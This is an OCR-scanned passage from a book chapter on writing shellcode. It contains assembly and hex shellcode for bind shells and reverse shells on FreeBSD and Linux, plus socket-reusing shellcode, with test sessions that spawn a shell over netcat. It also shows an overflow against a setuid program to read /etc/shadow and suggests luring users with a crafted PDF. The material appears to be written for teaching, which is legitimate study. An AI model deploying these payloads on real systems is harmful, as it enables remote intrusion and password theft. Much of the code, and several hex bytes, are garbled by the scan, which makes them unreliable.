We use xchg instead of mov because once compiled, xchg takes only one byte of 
the shellcode while mov takes two. In addition to this, because we did a cdq at line 3, 
EDX contains only zeroes, therefore the instruction will result in a clean EAX register. 
The bind System Call 
The bind() system call assigns the local protocol address to a socket. The first argument 
should represent the file descriptor obtained from the socket system call.The second 
argument is a struct that contains the protocol, port number, and IP address that the 
socket will bind to. 

384 
Chapter 9 • Writing Shelkode II 
Y N G H L i S 
1 N £ V 
1 
2 
3 
4 
5 
6 
7 
8 
push 
ITIQV 
push byte 
push 
push 
mov 
push byte 
int 
0xAAAA02AA 
esi,es-p 
0x10 
esi 
edx 
alr104 
0x1 
0x80 
At line 7 of the socket system call, we pushed EAX.The value pushed and is still on 
the stack; we are using it to build our struct socknddr. The structure looks like the fol-
lowing in C: 
struct sockaddr_in { 
u i n t S _ t 
s i n „ l e n ; 
s a _ f a m i l y _ t 
sin_faini.ly7 
i n _ p o r t _ t 
s i n _ p o r t ; 
s t r u c t 
in_addr s i n _ a d d r ; 
char 
s i n _ z e r o [ 8 ] ; 
>; 
To make the bind function work, we push EAX followed by OxAAAA (43690) for 
the port number (sin_port), 02 for the sin_family (IP protocols), and any value for 
sin_len (OxAA in this case). 
Once the structure is on the stack, we store the stack pointer value in ESI. Now that 
a pointer to our structure is in the ESI register, we can start pushing the arguments on 
the stack. We push 0x10, the pointer to the structure, and the return value of the socket 
system call (line 5). The arguments are ready, so the bind system call identifier is placed 
in AL so that the kernel can be called. Before calling the kernel, we push 0x1 on the 
stack to satisfy the kernel calling convention. In addition, the value 0x1 is already part of 
the argument list for the next system call, which is listenfj. 
The listen System Call 
Once the socket is bound to a protocol and port, you can now use the listen system call 
to listen for incoming connections. To do this you can execute listen with the socketQ 
file descriptor as argument one and a number of maximum incoming connections the 
system should queue. If the queue is 1, two connections come in; one connection will 
be queued, while the other one will be refused. 
1 
push 
edx 
2 
mov 
a l , 1 0 6 
3 
push 
ecx 
4 
i n t 
0x80 
Analysis 
We push EDX, which still contains the return value from the socket system call, and put 
the listen system call identifier in the AL register. We push ECX, which still contains 
zeroes only, and call the kernel. The value in ECX that is pushed on the stack will be 
part of the argument list for the next system call. 

Writing Shellcode II • Chapter 9 
385 
The accept System Call 
Using the accept system call you can accept connections once the listening socket 
receives them.The accept system call then returns a file descriptor that can be used to 
read and write data from and to the socket. 
To use accept, execute it with the socket() file descriptor as argument one.The 
second argument, which can be NULL, is a pointer to a sockaddr structure. If you use 
this argument, the accept system call will put information about the connected client 
into this structure. This can, for example, allow you to get the connected client's IF 
address. When using argument 2, the accept system call will put the size of the filled-in 
sockaddr struct in argument three. 
1 
push 
eax 
2 
push 
edx 
3 
cdq 
4 
mav 
a l , 3 0 
5 
push 
edx 
6 
i n t 
0x80 
Analysis 
When the listen system call is successful, it returns a I) in the EAX register.This has the 
result that EAX only contains zeroes and we can push it safely on the stack to represent 
our second argument of the accept system call. We then push EDX with the value of 
the socket system call for the last time on the stack. Because at this point EAX contains 
only zeroes and we need a clean register for the next system call, we execute a CDQ 
instruction to make EDX clean. Now that everything is ready, we put the system call 
identifier for accept in the AL register, push EDX on the stack to satisfy the kernel, and 
make it available as an argument for the next system call. Finally, we call the kernel to 
have the system call executed. 
The dup2 System Calls 
The Dup2 syscall is utilized to "clone" or duplicate file handles. If utilized in C or C++ 
the prototype is int dup2 (int oldfilehandle, int newfilehandle).The Dup2 syscall clones 
the file handle oldfilehandle onto the file handle newfilehandle. 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
mov 
mov 
_ ^ ! > p : 
push 
mov 
inc 
push 
i n t 
loop lOOp 
el,3 
ebx, e. 
ebJt 
a l , 9 0 
e<3x 
edx 
0x80 
Analysis 
Because we have to execute the dup2 system call three times with almost the same argu-
ments, we are going to use ;i loop to save space.The loop instruction uses the value in 

Chapter 9 • Writing Shellcode II 
the CL register to determine how often it will have to run the same code. Every time 
the code is executed, the loop decreases the value in CL by one until it is zero and the 
loop ends. The loop will run the code three times and therefore place 3 in the CL reg-
ister. We then store the return value of the accept system call in E13X using the mov 
instruction. 
The arguments for the dup2 system calls are thus in the EBX and EDX registers. 
Remember that in the previous system call we pushed EDX already on the stack.This 
means that the first time we go trough the loop, we only have to push EBX (line 5) in 
order to have the arguments ready on the stack. We then put the identifier of the dup2 
in the AL register and increase EDX by one.This is done because the second argument 
of dup2 needs to represent stdin, stdout, and stderr in the first, second, and third run of 
the code. After increasing EDX, we push it on the stack to make the kernel happy, and 
so that we already have the second argument of the next dup2 system call on the stack. 
The execve System Call 
The almighty execve system call can be used to run a program. 
The first argument should be the program name; the second should 
be an array containing the program name and arguments. The last 
argument should be the environment data. 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
push 
push 
push 
mov 
push 
push 
push 
push 
mov al, 
int 
ecx 
0x68732f6e 
0x69622£2f 
ebx, esp 
ecx 
ecx 
ebx 
eax 
59 
OxBO 
Analysis 
Last but not least, we execute /bin/sh by pushing the string on the stack. Using the 
jmp/call technique in this case would take too many extra bytes and make the shellcode 
unnecessarily big. We can now see if the shellcode works correctly by compiling it with 
nasm and executing it with the s-proc tool: 
Terminal one: 
bash-2.05b$ nasm -o bind bind.E 
bash-2.05b$ s-proc -e bind 
Calling code ., 
Terminal two: 
bash-2.05b$ nc 127.0,0.1 43690 
uptime 
ltl4PM up 23 hrs, 8 users, load averages: 1.02, 0.52, 0.63 
exit 
bash-2.05b$ 

Writing Shellcode II • Chapter 9 
387 
A trace of the shellcode shows that the system calls we used are executed successfully: 
bash-2. 
Calling 
bash-2. 
-- snip 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
4650 
05b$ ktrace s-
code .. 
proc -e smallest 
05bS kdujnp | more 
> snip sn 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
snip snip snip-
ip--
CALL 
RET 
CALL 
RET 
CALL 
7>;:T 
CALL 
RET 
CALL 
RET 
CALL 
RET 
CALL 
RET 
CALL 
NAMI 
socket(0x2, 0x1,0) 
socket 3 
bind(0x3,0xbfbffa83,0xl0) 
bind 0 
listen(0x3,0x1) 
listen 0 
accept(0x3,0,0) 
accept 4 
dup2(0x4,0) 
dup2 0 
dup2[0x4,0x1) 
dup2 1 
dup2|0x4,0x2) 
dup2 2 
execve(Oxbfbffa40,0,0) 
"//bin/sh* 
If we convert the binary created from the assembly code, we get the following 
shellcode: 
sh-2.05b$ s-proc -p bind 
/* The following shellcode is 81 bytes long: */ 
char shellcode[] = 
-\x31\xc9\x31\xc0\x99\x50\x6a\x01\x6a\x02\x50\xb0\x61\xcd\x80" 
•\x92\x68\xaa\xO2\xaa\xaa\x39\xe6\x6a\xl0\x56\x52\xb0\x68\x6a" 
•\x01\xca\x80\x52\xb0\x6a\x51\xcd\x80\x50\x52\x99\xb0\xle\x52" 
•\xcd\x80\xbl\x03\x89\xc3\x53\xb0\x5a\x42\x52\xcd\x80\xe2\xr7" 
•\x51\x68\x6e\x2f\x73\x6B\x68\x2£\x2f\x62\x69\x89\xe3\x51\x51' 
"\x53\x50\xb0\x3b\xcd\x30"; 
Writing port binding shellcode for Linux is very different from writing port binding 
shellcode for Free BSD. With Linux, you have to use the socketcall system call to execute 
functions such as socket, bind, listen, and accept.The resulting shellcode is a bit larger 
then port binding shellcode for FreeBSD. When looking at the socketcall man page, we 
see that the system call has to be implemented like this: 
int socketcall(int call, unsigned long *args); 
So the socketcall system call requires two arguments.The first argument is the iden-
tifier for the function you like to use. In the net.h header file on your Linux system, you 
can find that the following functions are available (note the identifier numbers behind 
them): 
SYS_SOCKET 
SYS_BIND 
S¥S_CONNECT 
SlS_LlSTEN 
1 
2 
3 
• : 

388 
Chapter 9 • Writing Shelkode II 
SYS_ACCEPT 
S YS_GET SOCKNAME 
SYS_GETPEERNAME 
S YS_S0CKET PAIR 
SYS_SEND 
SYS_RECV 
SYS_SENDTO 
SYS_RECVFROW 
SYS_SHUTDOWN 
SYS_SETSOCKOPT 
SYS_GETSOCKOPT 
SYS_SENDMSG 
SYS RECVMSG 
5 
6 
7 
8 
9 
L'J 
11 
La 
•
:
-
, 
U 
lb 
16 
: 7 
The second argument of the socketcall system call is a pointer to the arguments that 
should be given to the function defined with the first argument. .So, executing 
socket(2,l,0) can be done using the following pseudo-code; 
socketcall{lr[pointer to array with 2,1,0]) 
Example 9.11 shows Linux port binding shelkode. 
^ t - ^ Example 9.11 Linux Port Bindinq Shelkode 
2 
3 
4 
5 
6 
7 
3 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
BITS 
52 
x o r 
e a x . e a x 
x o r 
e b x , e b x 
cdo; 
p u s h 
p u s h 
p u s h 
mov 
J :IL-
mov 
i n t 
mov 
p u s h 
p u s h 
mov 
p u s h 
p u s h 
p u s h 
mov 
i n c 
mov 
i n t 
p u s h 
p u s h 
mov 
mov 
mov 
i n t 
e a x 
b y t e 
0 x 1 
b y t e 
0x2 
e c x , e s p 
b l 
al,102 
0 x 8 0 
e s i , e a x 
; 
s t o r e 
t h e 
r e t u r n v a l u e 
i n 
e s i 
ectx 
l o n g 
0XAAAA02AA 
e c x , e s p 
b y t e 
0x10 
e c x 
e s i 
e c x , e s p 
b l 
a l , 1 0 2 
0 x 8 0 
e d x 
e s i 
e c x , e s p 
b l , 0x4 
a l , 1 0 2 
0 x 8 0 

Writing Shelkode II • Chapter 9 
389 
34 
push 
edx 
35 
push 
edx 
3 6 
push 
e s i 
37 
mov 
ecx,esp 
38 
inc 
b l 
39 
mov 
al,102 
40 
int 
0x80 
41 
42 
43 
xor 
ecx,ecx 
44 
mov 
c l , 3 
45 
lOOp: 
46 
dec 
cl 
47 
mov 
al H63 
48 
i n t 
0x80 
49 
jnz 
lOOp 
5 0 
51 
push edx 
52 
push long 
0x68732f2£ 
53 
push long 0x6e69622f 
54 
mov 
e b x , e s p 
55 
push edx 
56 
push ebx 
57 
mov 
e c x . e s p 
58 
mov 
a l , 
0x0b 
59 
i n t 
0x80 
Analysis 
The shellcode looks very similar to the FreeBSD binding shellcode. In fact, we use the 
exact same arguments and system calls but are forced to use the socketcall interface, and, 
of course, arguments are offered to the kernel in a different manner. Let's discuss the 
assembly code function by function. In lines 3 through 5, we make sure that the EAX, 
EBX, and EDX contain only zeroes. After this is done, we start off by executing the 
function: 
s o c k e t ( 2 . 1 , 0 ) ; 
We push 0, 1, and 2 on the stack and store the value of ESP into the ECX register. 
ECX now contains the pointer to the arguments (line 10). We then increase the BL reg-
ister by one. EBX was zero and now contains one, which is the identifier for the socket 
function. We use inc here and not mov because the compiler translates inc bl into one 
byte, while mov bl,0xl is translated into two bytes. 
The arguments are ready, so we put the socketcall system call identifier in the AL 
register (line 12) and give the processor back to the kernel.The kernel executes the 
socket function and stores the return value, which is a file descriptor, in the EAX reg-
ister. We move this value into ESI at line 14. The next function we want to execute is 
the following: 
bind[soc,[struct sockaddr *)&serv_addr,0x10); 
At lines 16 and 17, we begin building the structure. This struct is exactly the same as 
on FreeBSD and, again, we'll use port OxAAAA or 43690 to bind the shell one. After 

390 
Chapter 9 • Writing Shelkode II 
the structure is pushed on the stack, we store ESP in ECX (line 18). Now we can push 
the arguments for the bind function on the stack. At line 17, we push the last argument, 
0x10, then the pointer to the struct is pushed (line 18), and finally we push the file 
descriptor that was returned by socket.The arguments for the bind function are on the 
stack, so we store ESP back in ECX. By doing this, the second argument for our 
upcoming socketcall is ready and all we have to take care of next is the first argument 
before we can call the kernel. 
The EBX register still contains that value 1 (line 11). Because the identifier of the 
bind function is 2, we inc bl one more time at line 23. Then the system call identifier for 
socketcall is stored in the AL register and we give the processor back to the kernel. We 
can now move on to the next function: 
listentscc,0). 
This function is really easy. In order to prepare the arguments, we push edx, which 
still contains zeroes on the stack (line 27) and then push the file descriptor in ESI. Both 
arguments for the listen function are ready, so we store the pointer to them by putting 
the value of ESP in ECX. Because the socketcall identifier for listen is 4 and EBX cur-
rently contains 2, we have to do either an inc bl twice or a mov bl,0x4 once. We choose 
the latter and move 4 into the BL register (line 30). Once this is done, we put the syscall 
identifier for socketcall in AL and give the processor back to the kernel.The next func-
tion follows: 
cli=accept(soc,0j 0); 
This is another easy function. We push EDX twice, followed by a push of the file 
descriptor in ESI. With this the arguments are on the stack and we can store the value of 
ESP in ECX. At this point, the BL register still contains 4 and it needs to be 5 for the 
accept function. So we do an inc bl at line 38. Everything is ready for the accept func-
tion so we let the kernel execute the socketcall function and then store the return value 
of this function in EBX (line 4t).The assembly code can now create a socket, bind it to 
a port and accept a connection. Just like in the FreeBSI) port binding assembly code, we 
duplicate stdin, stdout, and stderr to the socket with a loop (lines 43 through 49), and 
execute a shell. 
Let's compile, print, and test the shellcode. To do this, you need to open two termi-
nals. One will be used to compile and run the shellcode while the other will be used to 
connect to the shell. On Terminal 1, use the following: 
'i * N I A E s s' Irootggabiel bind]# nasm -o bind bind.S 
B a m M I [t--ootSgabriei bind]# s-proc -p bind 
/* The following shellcode is 96 bytes long: */ 
char shellcode[] = 
"\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xel\xfe\xc3\xbO" 
^\x66\xcd\x30\x89\Jtc6\x52\x68\xaa\x02\xaa\)caa\x89\xel\)c6a\Jao•, 
"\x51\x56\x89\xel\xte\xc3\xb0\x66VKcd\x8OVK52\x56\x39\xel\xb3-
"\xO4\xb0\xS6\xcd\x8O\x52\x52\x56\x89\xel\xfe\xc3\xbO\x66\xcd" 
n\x80\x89\xc3\x31\xc9\xbl\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8" 
"\x52\x63\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" 

Writing Shellcode II • Chapter 9 
391 
"\x39\xel\xb0\x0b\xcd\x80"; 
[roottag^briel bind]# s-proc -e bind 
Calling code .,. 
Terminal 2: 
[root@g^briel bind] # netstat -a.1 f grep 43690 
tcp 
0 
0 *:43690 
*:* 
LISTEN 
[root@gabriel bind]# nc localhost 43 690 
uptime 
6:58pm up 27 days, 
2:03, 
2 users, 
load average: 1.00, 1.00, 1.00 
exit 
[root?gabriel bind]# 
It worked! With netstat, we are able to see that the shellcode was actually listening 
on port 43690 (OxAAAA) and when we connected to the port, the commands sent 
were executed. 
NOTE 
Take the port binding shellcode and modify it so that multiple connections can 
be accepted at the same time. Hint: Add fork() and a loop. To get the ultimate 
kick out of sheilcode writing, you will have to use it in a home-cooked exploit, 
Another example is to write an exploit for a known vulnerability and let the 
shellcode write a string from the program to stdout. Hint: Have a look at the 
variables reusing section. 
Reverse Connection Shellcode 
Reverse connection shellcode makes a connection from the hacked system to a different 
system where it can be caught with network tools such as netcat. Once the shellcode is 
connected, it will spawn an interactive shell.The fact that the shellcode connects from 
the hacked machine makes it very useful for trying to exploit a vulnerability in a server 
behind a firewall.This kind of shellcode can also be used for vulnerabilities that cannot 
be exploited directly. For example, a buffer overflow vulnerability has been found in 
Xpdf. a PDF displayer for Unix-based systems. While the vulnerability is very inter-
esting, exploiting it on remote systems is very hard because you cannot force someone 
to read a specially crafted PDF file that exploits the leak. One possibility to exploit this 
issue in the wild would be to create a PDF that draws the attention of potentially 
affected Unix users. Within this PDF, you could embed shellcode that connects over the 
Internet to your machine, from which you could control the hacked systems. 
Let's have a look at how this kind of functionality is implemented in C: 
^ ^ ^ " 
1 
*include<unist:d.h> 
^ B ^ Q 
2 
»include<sys/socket.h> 
3 
#include<netinet/in.h> 
4 
I 

392 
Chapter 9 • Writing Shellcode II 
5 
i n t 
s o c d r e ; 
6 
s t r u c t 5Qckattdr_in serv_addr j 
7 
8 
i n t 
mainO 
9 ! 
10 
11 
s e r v _ a d d r . s i n _ f a m i ly=2; 
12 
serv_addr ,sin_addi-.s_addr=0x210c 06 0a; 
13 
serv_adar.sin_port=OxAAAA; 
/* p o r t 43690 */ 
1 4 
Boc=socket [ 2 . 1 , 6 ) ; 
15 
re = connect [soc, 
{ s t r u c t sockaddrM&serv_addr r 0x10) ; 
16 
dup2(soc.O); 
17 
dup2lsoc, 1) ; 
1 8 
d u p 2 l s o c , 2 ) ; 
1 9 
e x e c v e l V b i n / s h " , 0 . 0 ) ; 
20 
t 
As you can see, this code is very similar to the port binding C implementation 
except for the fact that we replace the bind and accept system calls with a connect 
system call. There is one issue with port binding shellcode: the IP address of a controlled 
computer has to be embedded in the shellcode. Since many IP addresses contain zeroes, 
they may break the shellcode. Example 9.12 shows the assembly implementation of a 
reverse shell for FreeBSD. 
Example 9.12 Reverse Connection Shellcode for FreeBSD 
1 
BITS 32 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
xor 
mul 
push 
push 
push 
mov 
push 
i n t 
mov 
push 
push 
mov 
push 
push 
push 
xor 
mov 
push 
i n t 
xor 
mov 
lOOp: 
push 
b y t e 
b y t e 
b y t e 
ecx, 
ecx 
ecx 
eax 
0x01 
0x02 
a l , 9 7 
eax 
0x80 
edx,eax 
OxfeOlaScO 
0xAAAA02AA 
e&Xjesp 
0x10 
BOX 
edx 
e a x , e a x 
a l , 9 S 
eax 
0x80 
ebx,ebx 
c l r 3 
ebx 

Writing Shelkode II • Chapter 9 
393 
31 
push 
32 
33 
push 
34 
inc 
35 
int 
edx 
al,90 
efaoc 
0x80 
36 loop loop 
37 
38 
xor 
39 
push 
40 
push 
41 
push 
4 2 
43 
push 
44 
push 
45 
:..:.;::: 
46 
push 
47 
48 
int 
Analys: 
eax,eax 
•::r.X 
0x68732f6e 
0x69622f2f 
ebx, esp 
eax 
oax 
ebx 
i'^A 
al, 
59 
SO): 
is 
Until line 17, the assembly code should look familiar to you, except for the mul ecx 
instruction in line 4.This instruction causes the EAX register to contain zeroes. It is 
used here because, once compiled, the mul instruction takes only one byte while XOR 
takes two; the result of both instructions is the same in this case. 
After the socket instruction is executed, we use the connect system call to set up the 
connection. For this system call, three arguments are needed: the return value of the 
socket function, a structure with details such as the IP address and port number, and the 
length of this structure. These arguments are similar to those used earlier in the bind 
system calls. However, the structure is initialized differently because this time it needs to 
contain the IP address of the remote host to which the shellcode has to connect. 
We create the structure as follows. First, we push the hex value of the IP address on 
the stack at line 14.Then we push the port number OxAAAA (43690), protocol ID: 02 
(IP), and any value for the sin_len part of the structure. After this is all on the stack, we 
store the stack pointer ESP in EAX so that we can use it as a pointer to the structure. 
Identifying the HEX representation of your IP address is straightforward; an IP 
address has four numbers—put them in reverse order and convert every byte to hex. For 
example, the IP address 1.2.3.4 is 0x04030201 in hex. A simple line of Perl code can 
help you calculate this: 
SU-2.Q5a# perl -e 'printf "Ox" . "%02x"x4 . " \ n " , 4 , 3 , 2 , 1 ' 
0x04030201 
Now we can start pushing the arguments for the connect system call on the stack. 
First, 0x10 is pushed (line 18), then the pointer to the structure (line 19), followed by 
the return value of the socket system call (line 20). Now that these arguments are on 
the stack, the system call identifier for connect is put into the AL register and we can 
call the kernel. 
After the connect system call is executed successfully, a file descriptor for the con-
nected socket is returned by the system call. This file descriptor is duplicated with stdin, 

394 
Chapter 9 • Writing Shelkode II 
stderr, and stdout, after which the shell /bin/sh is executed. This piece of code is exactly 
the same as the piece of code behind the accept system call in the port binding example. 
Now let's have a look at a trace of the shellcode: 
mmgggm S67 
^^^H 667 
667 
667 
667 
667 
667 
667 
667 
667 
667 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
s-proc 
CALL 
RET 
CALL 
RET 
CALL 
RET 
CALL 
RET 
CALL 
RET 
CALL 
KAMI 
socket(0x2, Oxl,0) 
socket 3 
connect(0x3,0xbfb££a74,0x10) 
connect 0 
dup2(0x3,0) 
dup2 0 
dup2(0x3,0xl> 
dup2 1 
dup2(0x3,0x2) 
dup2 2 
execve(0xbfbffa34,0,01 
•//bin/sh 
Great, it worked! In order to test this shellcode, you need to have an application 
running on the machine to which it is connected. A great tool for this is netcat, which 
can listen on a TCP or UDP port to accept connections. So in order to test the given 
connecting shellcode, you will have to let the netcat daemon listen on port 43690 using 
the command nc —! —p 43690, 
Socket Reusing Shellcode 
Port binding shellcode is very useful for some remote vulnerabilities but is often too 
large and not very efficient. This is especially true when exploiting a remote vulnera-
bility to which you have to make a connection. With socket reusing shellcode, this con-
nection can be reused, which saves a lot of code and increases the chance that your 
exploit will work. 
The concept of reusing a connection is really simple. When you make a connection 
to the vulnerable program, the program will use the accept function to handle the con-
nection. As shown in the two port binding shellcode examples, 9.9 and 9.10, the accept 
function returns a file descriptor that allows communication with the socket. 
Shellcodc that reuses a connection uses the dup2 system call to redirect stdin, stdout, 
and sterr to the socket and executes a shell. It's as simple as that.There is only one 
problem. Because the value returned by accept is required and this function isn't exe-
cuted by the shellcode, you will need to do some guessing.You can help the shellcode 
with this. 
Simple, single-threaded, network daemons often use some file descriptors during 
initialization of the program and then start an infinite loop in which connections are 
accepted and processed.These programs often get the same file descriptor back from the 
accept call as the accept connection sequentially. Have a look at this trace: 
1 603 remote_format_strin CALL 
socket(0x2.0x1,0x6) 
2 
603 remote_format_strin RET 
socket 3 
3 
603 remote_format_strin C A L L 
bind(0x3,Oxbfbffblc, 0x10) 
4 
603 remote_format_strin RET 
bind 0 
5 603 remote_format_strin CALL 
listen(0x3.Oxl) 
6 
603 remote_format_strin RET 
listen 0 
7 603 remote_format_strin CALL 
accept(0x3,0,0) 

Writing Shellcode II • Chapter 9 
395 
8 
603 remote_format_strin RET 
accept 4 
9 
603 remote_format_strin CALL read(0x4,Oxbfbff8f0,Oxlf4 
The program creates a network socket and starts listening on it. Then at line 7 a net-
work connection is accepted for which file descriptor number 4 is returned.Then the 
daemon uses the file descriptor to read data from the client. 
Imagine that at this point some sort of vulnerability' that allows shellcode to be exe-
cuted can be triggered. All we would have to do to get an interactive shell is execute the 
system calls in Example 9.13. 
h*"M"* Example 9.13 dup 
• • • • • • 
1 
dup2 (4,0); 
2 
dup2(4,1); 
3 
dup2(4,2); 
4 
execveC /bin/sh", 0,0); 
Analysis 
First, we dup stdin, stdout, and stderr with the socket in lines 1 through 3.This has the 
result that when data is sent to the socket, the program receives it on stdin and when 
data is sent to stderr or stdout by the program, the data is redirected to the client. 
Finally, the shell is executed and the program is hacked. We'll only have a look (in 
Example 9.14) at how this kind ofshellcodc is implemented on Linux because we have 
already discussed the dup2 and execve system calls in the previous port binding shell-
code examples. 
• _ _ _ Example 9.14 Linux Implementation 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
xor 
mov 
mov 
ICC'TJ 
dec 
mov 
int 
jnz 
push 
push 
push 
:r.ov 
push 
push 
mov 
mov 
ecx, ecx 
bl,4 
cl,3 
cl 
al,63 
OxSQ 
100p 
edx 
long Qx&8732f2f 
long Gx6e69622f 
ebx,esp 
edx 
ebx 
ecx, esp 
al, 0x0b 
int 0x30 
Analysis 
You can recognize the dup2 loop between lines 1 and 9 from the port binding shell-
code. The only difference is that we directly store the file descriptor value 4 in the 13L 
register because we know from the trace that this is the number of the descriptor that is 

396 
Chapter 9 • Writing Shelkode II 
returned by the accept system call when a connection is accepted. After stdin. stdout, 
and stderr have been dup'ed with this file descriptor, the shell /bin/sh is executed. Due 
to the small number of system calls used in this shellcode, it will take very little space 
once compiled: 
bash-2.05b$ s-proc -p reuse_socket 
/* The following shellcode is 33 bytes long: */ 
char shellcodeL3 = 
"\x31\xc9\xbl\xO3\xfe\xc9\xb0\x3f\xcd\x80\x75\xf3\x52\x68\x2f" 
"\x2f\x73\x6B\x68\x2f\x62\*69\x6e\>t89\xe3\x52\)(53\x89\xel\xbC)" 
"\x0b\xcd\x8G-; 
bash-2.05bS 
Reusing File Descriptors 
In Example 9.14, we showed how to reuse an existing connection to spawn an interac-
tive shell using the file descriptor returned by the accept system call. It is very important 
to know that once a shellcode is executed within a program, it can take control of all 
file descriptors used by that program. Example 9.15 shows a program that is supposed to 
be installed via setuid root on a Linux or FreeBSl) system. 
I 
r l i C M ^ 
l^ Example 9.15 setuid Root 
1 
#include <;fcntl .h> 
2 
if include <unistd.h> 
3 
4 void handle_fd(int fd, char *stuff) £ 
5 
6 
char small[256] ; 
7 
strcpy(small,stuff) ; 
o 
mernset (small, 0, sizeof (small) ) ; 
9 
read(fd,small,256); 
10 
/* rest of program *J 
11 i 
12 
13 int main (int argc, char **argv, char *"*envpj { 
14 
15 
int fd; 
16 
f d = open (" /etc /shadow", O.RDONLY) ; 
17 
setuid(getuid() ) ; 
18 
setgidlgetgidf)); 
19 
handle_file(fd,argv[l]); 
20 
return 0; 
21 ) 
Analysis 
The program, which is meant to be executable for system-level users, only needs its 
setuid privileges to open the file /etc/shadow. After the file is opened (line 16), it there-
fore drops the privileges immediately (see lines 17 and 18).The open function returns a 

Writing Shellcode II • Chapter 9 
file descriptor that allows the program to read from the file, even after the privileges 
have been dropped. 
Now things become more interesting. At line 7, the first argument we gave to the 
program is copied without proper bounds checking into a fixed memory buffer that is 
256 bytes in size. We can trigger a buffer overflow! With the buffer overflow, we have 
the program execute shellcode and let that shellcode read the data from the shadow file 
by using the file descriptor. 
When executing the program with a string larger than 256 bytes, we can overwrite 
important data on the stack, including a return address: 
[root@gabriel /tmp] # ./readshadow 'perl -e 'print "A" x 268;print "BBBB"H' 
Segmentation fault (core dumped) 
[root@gabriel /tmp]# gdb -q -core-core 
Core was generated by . /readshadow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 
Program terminated with signal 11, Segmentation fault. 
#0 0x42424242 in ?? () 
(gdb) info reg eip 
eip 
0x42424242 
0x42424242 
(gdb) 
A 
NOTE 1 
Writing exploits is detailed in Chapters 10, 11, and 12. 
Example 9.16 shows the system calls used by the program.The read system call is 
especially interesting because we would like to read from the shadow file as well. 
iv*ti>"> Example 9.16 System Calls 
1 
lroot@gabriel /tmpJ ft strace -o trace.txt ./readshadow aa 
2 
(rootOgabriel /tmpJ 8 cat trace.txt 
3 execvel"./readshadow", ["./readshadow", "aa"], [/* 23 vars */]) = 0 
4 
_ s y s C t l ( { { C T L _ K E R N , 
KERN_OSRELEASE>, 
2, 
" 2 . 2 . 1 6 - 2 2 " , 
9, 
NULL, 
0}) 
= 0 
5 
brk(0) 
- 0x30497£c 
6 
old_mmap(KULL, 4096, PRQT_READ] PROT_WRITE, MAP_PRIVATE | HAP_ANONYMOUS, -1, 0) = 
0x40017000 
7 open ("/etc/Id.so,preload", 0„RDONLY) 
= -1 ENOENT (No such file or directory) 
8 open! "/etc/Id.so.cache", 0_RDONLY) 
= 4 
9 
fstat64I4, 0xbffff36c) 
= -1 ENOSYS (Function not implemented) 
10 
fstat(4, {st_mode=S_IFREG[0644, st_size=15646, 
. . .}) = 0 
11 
old_mmap(NULL, 15646, PROT_READ, KAP_PRIVATE, 4, 0) = 0x40013000 
12 
close(4) 
= 0 
13 
openC/lib/libc.so-6", 0_RDONLY) 
= 4 
14 
fstat(4, (st_mode=S_IFREGJ0755, st„size=4776568, ...}) = 0 
1 5 
read[4, 
"\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220\274".... 4096) = 4096 
16 
old_mmap(NULL, 
1 1 9 6 7 7 6 , 
PROT_READ | PROT„EXEC. 
MAP_PR1VATE, 
4, 
0) 
= 
0x400 IcO 00 
17 
mprotectf0x40137000, 37608, PROT_NONE) 
a 0 
18 
o l d _ m i n a p ( 0 x 4 0 1 3 7 0 0 0 , 
2 4 5 7 6 , 
PROT_READ|PROT_WRITE, 
MAP_PRIVATE | WAP_FIXED, 
4, 
OxllaOOQ) 
0 x 4 0 1 3 7 0 0 0 
1 9 
O l d _ m m a p ( 0 x 4 0 1 3 d 0 0 0 , 
1 3 0 3 2 , 
PROT_READ|PROT_WRITE, 
MAP_PRIVATEIMAP_FIXED|MAP_ANONYMOUS, 
1, 
0) 
= 
0 x 4 0 1 3 d 0 0 0 

398 
Chapter 9 • Writing Shelkode II 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
c l o s e ( 4 ] 
munmapl0x40018000, 
15646) 
g e t p i d t ) 
open [ V e t c / s h a d o w " , 
0_RDONLY) 
getuid32 0 
getui&O 
setuidlO) 
g e t g i d l ) 
setgidtOI 
reacs (4 , 
" r o o t : $l$wpb5dGdgSFarri 
_ e x i t (0) 
[root@gabriel /tmp] tf 
•9Ur. 
= 0 
= D 
= 7030 
= 4 
= -1 ENOSYS (Fl 
= 0 
= 0 
= 0 
= 0 
EiecuYfu" . . . . 256) 
= 256 
- 
'J 
Analysis 
Because it isn't possible for non-rootl users to trace system calls of a setuid or setgid pro-
gram, we had to trace it as root. You can see this in the trace because the program tries 
to set the program user ID and group ID to those of the user executing it. Normally, 
this has the result that the program obtains lower privileges. In this case, because we are 
already root, no privileges are dropped, 
If you look at line 23, you will see our open function in action. The function suc-
cessfully opens the file "/etc/shadow" and returns a file descriptor that can be used to 
read from the file. Note that in this case we can only read from the file because it is 
opened with the 0_RDONI_Y flag. Things would have been even worse if the open 
function was used with the 0_RDRW flag since it allowed us to write to the file. 
The file descriptor 4 returned by the open function is used by the read function at 
line 29 to read 256 bytes from the shadow file into the small array (see Example 9.16, 
line 9).The read function thus needs a pointer to a memory location to store the x bytes 
read from the file descriptor in {x is the third argument of the read function). 
We're going to write an exploit for this program that is going to read a large chunk 
from the shadow file in the "small" buffer, after which we will print this buffer to srdout 
using the write function. So, the two functions we want to inject trough the overflow in 
